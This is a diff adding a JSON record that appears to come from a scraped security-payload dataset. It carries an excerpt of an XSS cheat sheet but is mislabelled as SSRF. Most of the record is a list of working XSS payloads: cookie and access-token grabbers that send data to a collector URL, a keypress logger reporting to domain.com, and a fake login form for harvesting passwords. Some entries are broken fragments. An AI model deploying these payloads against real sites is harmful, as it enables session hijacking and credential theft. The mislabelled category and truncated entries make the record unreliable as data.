@@ -1,0 +1,27 @@
+{
+  "id": "ssrf-b7c5b1c6aade",
+  "category": "SSRF",
+  "title": "README",
+  "description": "# Cross Site Scripting\n\n> Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.\n\n## Summary\n\n- [Methodology](#methodology)\n- [Proof of Concept](#proof-of-concept)\n    - [Data Grabber](#data-grabber)\n    - [CORS](#cors)\n    - [UI Redressing](#ui-redressing)\n    - [Javascript Keylogger](#javascript-keylogger)\n    - [Other Ways](#other-ways)\n- [Identify an",
+  "payloads": [
+    "<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>",
+    "<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>",
+    "<script>new Image().src=\"http://localhost/cookie.php?c=\"+document.cookie;</script>",
+    "<script>new Image().src=\"http://localhost/cookie.php?c=\"+localStorage.getItem('access_token');</script>",
+    "<script>",
+    "fetch('https://<SESSION>.burpcollaborator.net', {",
+    "</script>",
+    "<script>",
+    "document.body.innerHTML = \"</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>\"",
+    "</script>",
+    "<img src=x onerror='document.onkeypress=function(e){fetch(\"http://domain.com?k=\"+String.fromCharCode(e.which))},this.remove();'>",
+    "More exploits at [http://www.xss-payloads.com/payloads-list.html?a#category=all](http://www.xss-payloads.com/payloads-list.html?a#category=all):",
+    "- [Taking screenshots using XSS and the HTML5 Canvas](https://www.idontplaydarts.com/2012/04/taking-screenshots-using-xss-and-the-html5-canvas/)",
+    "- [JavaScript Port Scanner](http://www.gnucitizen.org/blog/javascript-port-scanner/)",
+    "- [Network Scanner](http://www.xss-payloads.com/payloads/scripts/websocketsnetworkscan.js.html)"
+  ],
+  "references": [
+    "PayloadsAllTheThings/XSS Injection/README.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
